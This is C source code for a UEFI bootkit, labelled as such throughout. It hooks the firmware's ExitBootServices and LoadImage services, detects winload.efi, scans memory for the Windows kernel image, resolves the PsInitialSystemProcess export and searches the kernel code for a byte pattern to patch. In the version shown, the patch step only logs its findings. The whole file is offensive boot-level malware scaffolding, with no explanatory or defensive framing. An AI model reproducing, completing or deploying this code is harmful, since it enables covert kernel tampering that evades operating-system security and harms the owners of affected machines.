#include <Uefi.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Protocol/LoadedImage.h>
#include "Log.h"
#include "Pe.h"
#include "Hook.h"

STATIC EFI_EXIT_BOOT_SERVICES gOrigExitBootServices = NULL;
STATIC EFI_LOAD_IMAGE       gOrigLoadImage = NULL;

STATIC UINT8 *FindNtoskrnl(VOID) {
    for (UINT64 Addr = 0x100000; Addr < 0x80000000ULL; Addr += 0x1000) {
        UINT8 *P = (UINT8 *)Addr;
        if (P[0] != 'M' || P[1] != 'Z') continue;

        UINT32 Lfanew = *(UINT32 *)(P + 0x3C);
        if (Lfanew == 0 || Lfanew > 0x1000) continue;

        UINT32 Sig = *(UINT32 *)(P + Lfanew);
        if (Sig != 0x00004550) continue;

        UINT16 Magic = *(UINT16 *)(P + Lfanew + 0x18);
        if (Magic != 0x20B) continue;

        UINT32 SizeOfImage = *(UINT32 *)(P + Lfanew + 0x18 + 0x38);
        if (SizeOfImage < 0x100000 || SizeOfImage > 0x4000000) continue;

        UINT8 *Data = PeSection(P, ".data");
        if (!Data) continue;

        if (PePattern(Data, 0x100000, (UINT8 *)"ntoskrnl.exe", NULL, 12)) {
            return P;
        }
    }
    return NULL;
}

STATIC VOID PatchKernel(VOID) {
    LogStr("[bootkit] scanning for ntoskrnl\r\n");

    UINT8 *Nt = FindNtoskrnl();
    if (!Nt) {
        LogStr("[bootkit] ntoskrnl not found\r\n");
        return;
    }

    LogStr("[bootkit] ntoskrnl base ");
    LogHex((UINT64)Nt);
    LogStr("\r\n");

    UINTN Size = PeImageSize(Nt);
    LogStr("[bootkit] image size ");
    LogU64(Size);
    LogStr("\r\n");

    UINT64 Exp = PeExport(Nt, "PsInitialSystemProcess");
    if (Exp) {
        LogStr("[bootkit] PsInitialSystemProcess ");
        LogHex(Exp);
        LogStr("\r\n");
    }

    UINT8 *Text = PeSection(Nt, ".text");
    if (Text) {
        UINT8 Pattern[] = { 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00 };
        UINT8 Mask[]    = { 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00 };
        UINT8 *Hit = PePattern(Text, 0x200000, Pattern, Mask, 7);
        if (Hit) {
            LogStr("[bootkit] candidate site ");
            LogHex((UINT64)Hit);
            LogStr("\r\n");
        }
    }
}

STATIC EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey) {
    LogStr("[bootkit] ExitBootServices intercepted\r\n");
    PatchKernel();
    return gOrigExitBootServices(ImageHandle, MapKey);
}

STATIC EFI_STATUS EFIAPI HookedLoadImage(
    BOOLEAN BootPolicy,
    EFI_HANDLE ParentImageHandle,
    EFI_DEVICE_PATH_PROTOCOL *DevicePath,
    VOID *SourceBuffer,
    UINTN SourceSize,
    EFI_HANDLE *ImageHandle
) {
    EFI_STATUS Status = gOrigLoadImage(BootPolicy, ParentImageHandle, DevicePath, SourceBuffer, SourceSize, ImageHandle);
    if (EFI_ERROR(Status)) return Status;

    if (!DevicePath) return Status;

    EFI_DEVICE_PATH_PROTOCOL *Node = DevicePath;
    while (!IsDevicePathEnd(Node)) {
        if (DevicePathType(Node) == MEDIA_DEVICE_PATH && DevicePathSubType(Node) == MEDIA_FILEPATH_DP) {
            CHAR16 *Name = ((FILEPATH_DEVICE_PATH *)Node)->PathName;
            if (StrStr(Name, L"winload.efi")) {
                LogStr("[bootkit] winload.efi loaded\r\n");
                LogHex((UINT64)SourceBuffer);
                LogStr("\r\n");
            }
        }
        Node = NextDevicePathNode(Node);
    }
    return Status;
}

EFI_STATUS EFIAPI BootkitEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    LogInit();
    LogStr("\r\n[bootkit] initializing\r\n");

    gOrigExitBootServices = gBS->ExitBootServices;
    gBS->ExitBootServices = HookedExitBootServices;
    LogStr("[bootkit] ExitBootServices hooked\r\n");

    gOrigLoadImage = gBS->LoadImage;
    gBS->LoadImage = HookedLoadImage;
    LogStr("[bootkit] LoadImage hooked\r\n");

    return EFI_SUCCESS;
}